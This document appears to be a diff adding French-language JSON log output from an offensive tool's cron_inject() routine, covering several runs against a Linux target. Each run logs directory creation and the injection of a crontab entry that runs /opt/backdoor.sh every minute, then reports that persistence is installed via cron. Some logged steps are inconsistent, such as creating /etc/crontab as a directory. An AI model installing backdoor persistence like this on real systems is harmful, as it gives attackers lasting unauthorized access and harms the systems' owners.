+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:23 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:23 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:23 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:23 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:25 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:25 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:25 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:25 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:25 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:29 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:30 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:32 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:32 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:32 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:32 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 11:57:32 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:29 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:30 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:30 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:32 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:32 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:32 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:32 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 15:34:32 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:34 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:35 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:36 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:38 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:39 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:39 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:39 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 16:49:39 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:08 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:09 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:10 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:10 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:10 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:10 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:10 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:10 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:12 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:12 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:13 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:13 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Mon Aug 24 17:38:13 2026",
+        "message": "Fin cron_inject()"
+    }
+]
